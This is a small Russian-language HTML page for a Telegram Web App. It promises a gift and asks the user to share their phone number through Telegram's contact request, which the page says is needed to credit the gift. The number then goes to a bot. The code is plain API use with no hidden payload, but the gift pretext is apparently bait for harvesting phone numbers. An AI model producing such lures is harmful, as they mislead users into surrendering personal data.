<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Получить подарок</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
        }
        h2 {
            margin-bottom: 10px;
        }
        p {
            color: var(--tg-theme-hint-color, #888888);
            margin-bottom: 30px;
        }
        button {
            background-color: var(--tg-theme-button-color, #3390ec);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            max-width: 300px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        button:active {
            transform: scale(0.98);
        }
    </style>
</head>
<body>

    <h2>🎁 Забрать подарок</h2>
    <p>Для начисления подарка нам нужно подтвердить ваш номер телефона.</p>
    
    <button onclick="requestPhone()">Поделиться номером</button>

    <script>
        // Инициализируем Web App
        let tg = window.Telegram.WebApp;
        tg.expand(); // Разворачиваем на весь экран
        tg.ready();  // Сообщаем телеграму, что приложение готово

        function requestPhone() {
            // Вызываем системный запрос контакта
            tg.requestContact(function(shared) {
                if (shared) {
                    // Если пользователь нажал "Поделиться", закрываем Web App.
                    // Контакт автоматически улетит в бота и попадет в contact_handler
                    tg.close();
                }
            });
        }
    </script>

</body>
</html>
